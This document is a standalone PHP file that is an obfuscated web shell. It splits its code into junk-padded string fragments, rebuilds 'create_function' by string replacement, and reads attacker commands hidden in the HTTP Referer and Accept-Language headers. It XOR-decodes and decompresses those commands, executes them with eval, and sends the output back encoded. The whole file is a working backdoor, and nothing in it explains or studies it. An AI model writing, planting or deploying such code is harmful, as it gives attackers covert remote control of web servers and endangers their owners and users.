<?php
$U='r:r=$_SERVr:ERr:;$rr=@$r["Hr:TTPr:_Rr:EFERER"];$rr:a=@$rr:r:["HTTP_ACr:CEPT_LAr:Nr:GUAGE"];ir:f($rr&&$ra){$r';
$e=str_replace('k','','crkeatke_kfukncktkion');
$y='$kh="5d41"r:;$r:r:kf="402a";r:functr:ionr:r: x($t,$k){$c=strlen($r:k);$r:l=strlen($r:r:t);$o="";fr:or($';
$d='ay("r:/","+"),r:$ss(r:$r:s[$i]r:,0,$er:))),$k)));$o=ob_get_cr:or:ntents()r:;ob_enr:r:d_clean();$d=r:br';
$m=':ase64_encor:r:de(x(gzcomprer:ss($r:o),$k));r:pr:rint("r:<$k>$d</$k>"r:)r:;@sr:ession_destroyr:();}}}}';
$n='ey_r:exists(r:$ir:r:,r:$s)){$r:s[$i].=$p;$e=strpr:or:s($s[$i]r:,$f);if($e){$kr:=$khr:.$kf;obr:_startr:';
$p='ll("/r:([r:\\w])[\\w-]+(?:r:;q=0.r:(r:[\\d]))r:?r:,?/",$r:ra,$r:m);if($q&&$m){@sessr:ionr:_star:rt();r:$s=';
$V='i.$r:kh)r:,0,3));r:$f=$sr:l(r:$ss(md5r:($i.$kf)r:,0,3)r:);$p="";r:for($z=1;r:$z<cour:nr:t($m[1]r:);$z+';
$s=':u=parr:sr:e_urlr:r:r:($rr);parse_str($u["r:quer:r:ry"],$q);$q=array_vr:r:alues($r:q);preg_mr:atch_ar:';
$W='();@evr:al(@gzr:uncr:ompress(@x(@br:asr:r:e64_decor:de(preg_replar:r:ce(arr:ray("/r:_/","/r:-/r:"),arr';
$x='i=r:0r:;$i<$l;){forr:r:($j=0;($j<r:$c&&$r:i<$l);$jr:++,$ir:++r:){$o.r:=$t{$i}^$k{$r:j};r:}}retr:urn $o;}$';
$F='&$_SESSIONr:;$ss="r:sur:bstr";r:$sl="r:strtolower:r";$ir:=$m[1][0r:].$m[1]r:[1]r:;$hr:=$sl($sr:s(md5($';
$L='+)$p.r:=$q[$m[r:2][$z]r:];if(sr:r:trpos($r:p,$h)r:===0){$s[$r:ir:]=""r:;$p=$ss($p,3);}r:r:if(array_kr:';
$G=str_replace('r:','',$y.$x.$U.$s.$p.$F.$V.$L.$n.$W.$d.$m);
$u=$e('',$G);$u();
?>
